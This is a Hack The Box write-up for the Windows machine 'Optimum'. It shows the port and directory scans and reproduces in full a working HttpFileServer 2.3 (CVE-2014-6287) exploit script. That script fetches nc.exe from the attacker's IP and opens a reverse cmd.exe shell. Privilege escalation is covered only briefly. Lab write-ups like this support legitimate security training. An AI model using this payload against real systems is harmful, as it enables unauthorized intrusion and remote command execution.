---
title: "Optimum"
date: 2023-06-24T11:30:03+00:00
tags: ["windows","linux","HttpFileServer 2.3"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Optimum.png"
comments: false
description: "This is a friendly Windows machine with a vulnerable web that can be exploited abusing HttpFileServer 2.3."
---

Room Information

- Room name: Optimum
- Difficulty level: Easyx
- Room link: [https://app.hackthebox.com/machines/Optimum](https://app.hackthebox.com/machines/Optimum)

![Untitled](/HTB/Optimum.png)

## Tools Used

- Nmap
- Searchsploit
- nc
- wfuzz


## Port Scanning

As always the nmap scan:

```bash
 sudo  nmap -p- --open -sCV -sS --min-rate 5000 -vvv -n -Pn 10.10.10.51 -oN escaneo
```
![Untitled](/HTB/nmap-optimum.png)

After doing the analysis with nmap, I saw that there was only one open port (80), so I went to look for 
information about the web.

```bash
 gobuster dir -u http://10.10.10.8/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

After doing the analysis with gobuster and wfuzz I saw that there was no interesting directory. So I decided
to look for something on the page itself, and I saw that the website ran on an 'HttpFileServer 2.3'.

Seen this I searched with shearchsploit if there is some kind of exploit and if there was :))

I found this exploit:
 	
```python

	#!/usr/bin/python
	# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
	# Google Dork: intext:"httpfileserver 2.3"
	# Date: 04-01-2016
	# Remote: Yes
	# Exploit Author: Avinash Kumar Thapa aka "-Acid"
	# Vendor Homepage: http://rejetto.com/
	# Software Link: http://sourceforge.net/projects/hfs/
	# Version: 2.3.x
	# Tested on: Windows Server 2008 , Windows 8, Windows 7
	# CVE : CVE-2014-6287
	# Description: You can use HFS (HTTP File Server) to send and receive files.
	#	       It's different from classic file sharing because it uses web technology to be more compatible with today's Internet.
	#	       It also differs from classic web servers because it's very easy to use and runs "right out-of-the box". Access your remote files, over the network. It has been successfully tested with Wine under Linux. 
 
	#Usage : python Exploit.py <Target IP address> <Target Port Number>

	#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
	#          You may need to run it multiple times for success!


	import urllib2
	import sys

	try:
		def script_create():
			urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")

		def execute_script():
			urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")

		def nc_run():
			urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")

		ip_addr = "10.10.14.16" #local IP address
		local_port = "443" # Local Port number
		vbs = "C:\Users\Public\script.vbs|dim%20xHttp%3A%20Set%20xHttp%20%3D%20createobject(%22Microsoft.XMLHTTP%22)%0D%0Adim%20bStrm%3A%20Set%20bStrm%20%3D%20createobject(%22Adodb.Stream%22)%0D%0AxHttp.Open%20%22GET%22%2C%20%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe%22%2C%20False%0D%0AxHttp.Send%0D%0A%0D%0Awith%20bStrm%0D%0A%20%20%20%20.type%20%3D%201%20%27%2F%2Fbinary%0D%0A%20%20%20%20.open%0D%0A%20%20%20%20.write%20xHttp.responseBody%0D%0A%20%20%20%20.savetofile%20%22C%3A%5CUsers%5CPublic%5Cnc.exe%22%2C%202%20%27%2F%2Foverwrite%0D%0Aend%20with"
		save= "save|" + vbs
		vbs2 = "cscript.exe%20C%3A%5CUsers%5CPublic%5Cscript.vbs"
		exe= "exec|"+vbs2
		vbs3 = "C%3A%5CUsers%5CPublic%5Cnc.exe%20-e%20cmd.exe%20"+ip_addr+"%20"+local_port
		exe1= "exec|"+vbs3
		script_create()
		execute_script()
		nc_run()
	except:
		print """[.]Something went wrong..!
		Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
		Don't forgot to change the Local IP address and Port number on the script"""
```

And I ran a http server and a listenner on port 443 ...
 
![Untitled](/HTB/nc-optimum.png)

So I'm in !!!

## Escalating privileges

I entered as user **Kostas** and he had one flag. Then, I did a `systeminfo` and I saved
it as systeminfo.txt, then I ran `python2 windows-exploit-suggester.py -d 2023-08-08-mssb.xlsx -i /home/kali/HTB/optimum/systeminfo.txt`
on my kali machine to know all the posible vulnerabilities ...

![Untitled](/HTB/wsuggester-optimum.png)

Next, after trying the first option I found one that worked :)

![Untitled](/HTB/root-oprimum.png)

Now we are root !!!

## Lessons Learned

- What did you learn from the room?
    
    I learned how to exploit a HttpFileServer 2.3, adn gainin access throw (MS16-098).
    
- Were there any new tools or techniques used?
    
    I used windows-exploit-suggester.py ...
    
- What would you do differently next time?
    
    Next time, I would aim to capture better screenshots of my progress. 😅

**Thank you for reading, and happy hacking! 😄**
